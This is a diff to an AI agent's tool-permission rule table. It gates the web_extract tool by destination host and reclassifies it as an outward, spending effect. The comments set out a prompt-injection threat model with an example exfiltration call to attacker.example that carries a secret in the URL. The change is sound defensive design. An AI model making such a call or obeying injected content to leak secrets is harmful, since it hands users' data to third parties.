@@ -151,34 +151,51 @@ export const BUILTIN_RULES: readonly PolicyRule[] = [
   // `web_search` / `web_extract` need a provider API key; the memory tools need
   // @ax/memory-strata. Inert where absent.
   //
-  // The two web tools carry `effect: 'spends'` (TASK-263). They are not merely
-  // reads: @ax/web-tools implements them by making a BILLED Anthropic Messages
-  // call per invocation on the operator's key, so every use costs money. They
-  // stay `allow` — a metered read with no third-party-visible effect is the
-  // case where holding would be pure friction — but the spend is now declared
-  // in the table instead of being a fact you had to know about
-  // `@ax/web-tools`' implementation to discover.
+  // The two web tools carry `spends` (TASK-263). They are not merely reads:
+  // @ax/web-tools implements them by making a BILLED Anthropic Messages call
+  // per invocation on the operator's key, so every use costs money, and the
+  // spend is declared in the table instead of being a fact you had to know
+  // about `@ax/web-tools`' implementation to discover.
   //
-  // They stay `provenance: 'catalog'` deliberately. `catalog` claims "reachable
-  // and no rule GATES it", which is still exactly true; declaring an effect is
-  // a disclosure, not a gate, so promoting these to `'rule'` would overstate
-  // how much the permission itself was deliberated.
+  // `web.search` stays `allow` + `provenance: 'catalog'`. `catalog` claims
+  // "reachable and no rule GATES it", which is exactly true of it; declaring an
+  // effect is a disclosure, not a gate, so promoting it to `'rule'` would
+  // overstate how much the permission itself was deliberated.
   //
-  // WEB_EXTRACT IS ALSO AN EXFILTRATION CHANNEL, and `spends` does not say so.
-  // `url-guard.ts` refuses only localhost/.local/.internal, so any PUBLIC URL
-  // the agent names is fetched — and under prompt injection (untrusted content
-  // is the normal case on this surface, invariant 5)
-  // `web_extract('https://attacker.example/?x=<secret>')` hands data to a
-  // third party that sees the request, unrecoverably. By the definition in
-  // `ToolEffect` that is `outward`.
+  // WEB_EXTRACT IS DIFFERENT NOW, and this is the TASK-330 decision written
+  // into the thing that enforces it.
   //
-  // It is filed as `spends` anyway, and that is a deliberate, narrow choice
-  // rather than a judgement that it is safe: marking it `outward` makes the
-  // lint force a hold on every page read, which is a UX decision about a live
-  // deployment and not one to smuggle in under a classification change.
-  // TASK-330 carries the decision. Flagged here, in the table, because the
-  // alternative is a rule that reads as though someone concluded it was
-  // harmless.
+  // It is also an EXFILTRATION CHANNEL. `url-guard.ts` refuses only
+  // localhost/.local/.internal, so any PUBLIC URL the agent names gets fetched
+  // — and under prompt injection (untrusted content is the NORMAL case on this
+  // surface, invariant 5) `web_extract('https://attacker.example/?x=<secret>')`
+  // hands data to a third party that sees the request, unrecoverably. By the
+  // definition in `ToolEffect` that is `outward`, so it is declared `outward`,
+  // and `lintRuleEffect`'s strictest-member-wins rule forbids `allow`.
+  //
+  // WHY THE ANSWER IS NOT SIMPLY "HOLD EVERY PAGE READ". That was the obvious
+  // reading of the lint and it is unusable: a prompt on every page read is a
+  // prompt people learn to click through, which buys nothing and costs the
+  // gate its credibility. So the rule attacks the CHANNEL instead. `egress`
+  // makes the verdict contingent on the target host:
+  //
+  //     private / internal -> deny   (url-guard.ts, underneath, unchanged)
+  //     host on the allowlist -> allow  (silent)
+  //     anything else -> hold        (approving remembers that host)
+  //
+  // The allowlist starts EMPTY, and that is safe only because a miss is a HOLD
+  // and not a refusal: nothing breaks on a fresh install, the first visit to a
+  // site asks once, and the list earns silence over time. Do not "fix" the
+  // empty default by seeding permissive entries.
+  //
+  // THE CAPABILITY CLAUSE SAYS "and remember the site" ON PURPOSE. Approving
+  // this hold grants the HOST, not the one page — `@ax/web-tools` records it on
+  // a successful fetch — and a person answering a question about one page read
+  // would not otherwise know that. The sentence is the disclosure, and it is on
+  // the rule because that is the only place it cannot drift from what happens.
+  //
+  // It is `provenance: 'rule'` now, not `'catalog'`: a human deliberated this
+  // one, which is precisely what `catalog` denies.
   {
     id: 'web.search',
     match: { tool: 'web_search' },
@@ -186,16 +203,17 @@ export const BUILTIN_RULES: readonly PolicyRule[] = [
     capability: 'search the web',
     subject: 'agent',
     provenance: 'catalog',
-    effect: 'spends',
+    effect: ['spends'],
   },
   {
     id: 'web.extract',
     match: { tool: 'web_extract' },
-    verdict: 'allow',
-    capability: 'read a web page you name',
+    verdict: 'hold',
+    capability: 'read a web page, and remember the site it came from',
     subject: 'agent',
-    provenance: 'catalog',
-    effect: 'spends',
+    provenance: 'rule',
+    effect: ['spends', 'outward'],
+    egress: { urlField: 'url' },
   },
   {
     id: 'memory.search',
